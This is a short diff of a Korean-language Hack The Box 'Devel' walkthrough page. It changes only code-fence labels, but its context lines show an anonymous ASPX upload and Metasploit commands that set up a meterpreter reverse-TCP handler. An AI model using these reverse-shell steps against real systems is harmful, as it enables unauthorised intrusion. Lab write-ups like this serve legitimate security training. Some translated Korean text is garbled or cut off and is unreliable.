@@ -35,7 +35,7 @@ link: "https://medium.com/@jaylinscorner/devel-hack-the-box-walkthrough-6a04f5f0
 
 <div class="content-ad"></div>
 
-```markdown
+```
 <img src="/assets/img/2024-06-19-DevelHackTheBoxWalk-through_3.png" />
 
 랜덤 ASPX 파일을 업로드한 후 익명 사용자의 업로드 기능을 이용할 수 있다는 점을 알 수 있습니다.
@@ -75,13 +75,13 @@ msfvenom을 사용하여 역술 쉘을 얻을 수 있는 올바른 페이로드�
 
 <div class="content-ad"></div>
 
-```markdown
+```
 msfconsole
 ```
 
 그런 다음 사용할 exploit으로 이동하겠습니다.
 
-```markdown
+```
 use exploit/multi/handler 
 ```
 
@@ -93,7 +93,7 @@ use exploit/multi/handler
 
 <div class="content-ad"></div>
 
-```markdown
+```
 ```js
 set payload windows/meterpreter/reverse_tcp
 ```
